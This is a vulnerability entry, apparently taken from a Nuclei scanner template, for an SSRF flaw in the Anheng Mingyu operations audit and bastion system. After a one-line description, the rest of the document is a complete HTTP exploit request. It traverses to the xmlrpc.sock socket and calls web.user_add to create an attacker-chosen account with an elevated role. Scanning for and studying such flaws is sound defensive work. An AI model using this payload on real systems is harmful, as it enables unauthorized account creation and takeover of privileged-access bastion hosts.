# Vulnerability: Mingyu Operation xmlrpc.sock - User Addition
**Classification:** CWE-918
**Source:** Nuclei Template (`mingyu-xmlrpc-sock-adduser.yaml`)

## Description
There is an SSRF vulnerability in the xmlrpc.sock interface of Anheng Mingyu operation and maintenance audit and risk control system, through which any user can be added to control the bastion machine

## Vulnerable Code Pattern / Exploit Payload
```http
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://{{random}}/wsrpc HTTP/1.1
Host: {{Hostname}}

<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>10.0.0.1</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>{{username}}</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>{{username}}</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>{{password}}</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>102</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>
```

